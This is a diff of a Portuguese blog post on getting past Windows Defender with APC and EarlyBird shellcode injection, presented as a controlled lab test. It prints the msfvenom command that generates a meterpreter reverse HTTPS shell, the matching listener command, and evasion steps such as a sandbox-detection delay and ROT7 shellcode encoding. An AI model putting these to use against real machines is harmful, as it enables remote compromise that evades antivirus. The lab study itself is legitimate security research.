@@ -384,17 +384,17 @@ Agora que já entendemos o funcionamento das variações, vamos explicar um caso
 
 ## Evadindo Windows Defender com injeções APC
 
-Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud Delivery Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um *wrapper* para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:
+Nesta seção, iremos tentar realizar o bypass dos módulos de Real Time Protection e Cloud-delivered Protection do Windows Defender. Para isso, testaremos a eficiência dos códigos de APC Injection, EarlyBird e Shellcode Runner (apenas um *wrapper* para rodar shellcode em um EXE), quando utilizados para injetar/carregar um payload do meterpreter, com níveis iguais de ofuscação e evasão de defesas. Os níveis são os seguintes:
 
 - Detecção de ambientes Sandbox para evasão de Antivírus, via `GetSystemTime` (delay de 10 segundos na execução). Caso uma sandbox seja detectada, o processo deverá encerrar;
 - Evasão de assinaturas com uso de encoder ROT7 para armazenar o shellcode no injetor. O código do ofuscador ROT7 está disponível no [Github](https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeObfuscator), sendo apenas necessário alterar a variável global "shellcode" para o shellcode gerado.
 
 O Shellcode Runner é nosso teste de controle, e os demais serão colocados à prova com relação à sua efetividade de acordo com a detecção/bloqueio recebidas no laboratório controlado.
 
-> Comando utilizado para gerar shell reversa x64 staged HTTPS do meterpreter ofuscada com o encoder x64/xor:
+> Comando utilizado para gerar shell reversa x64 staged HTTPS do meterpreter:
 > - `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.100.2 LPORT=443 EXITFUNC=thread -f c`
 > 
-> Comando para criar um listener no meterpreter
+> Comando para criar um listener no meterpreter:
 > - `msfconsole -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.100.2; set LPORT 443; set EXITFUNC thread; exploit"`
 
 ### Resultados Shellcode Runner
@@ -444,7 +444,7 @@ Testando a injeção EarlyBird, com o mesmo shellcode utilizado anteriormente, m
 
 ## Conclusão
 
-O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud Delivery Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.
+O cenário mais efetivo para evasão dos módulos Real Time Protection e Cloud-delivered Protection do Windows Defender durante os testes realizados foi a injeção EarlyBird.
 
 Não houve detecção do injetor, nem do conteúdo injetado, apenas bloqueio por comportamento de certas funcionalidades (como o comando shell) do meterpreter quando ele foi injetado no *explorer.exe* e *svchost.exe*.
 
